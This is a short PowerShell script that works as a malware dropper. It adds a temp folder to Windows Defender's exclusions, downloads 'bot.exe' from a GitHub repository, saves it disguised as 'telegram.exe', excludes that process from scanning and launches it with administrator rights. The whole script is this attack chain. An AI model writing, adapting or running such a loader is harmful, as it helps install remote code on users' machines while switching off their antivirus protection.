$systemPath = [System.IO.Path]::Combine($env:temp, "System")
New-Item -Path $systemPath -ItemType Directory -Force
Add-MpPreference -ExclusionPath $systemPath

$telegramUrl = "https://github.com/blackcode2290/test/raw/refs/heads/main/bot.exe"
$telegramPath = [System.IO.Path]::Combine($systemPath, "telegram.exe")

Invoke-WebRequest -Uri $telegramUrl -OutFile $telegramPath
Add-MpPreference -ExclusionProcess $telegramPath
Start-Process -FilePath $telegramPath -Verb RunAs
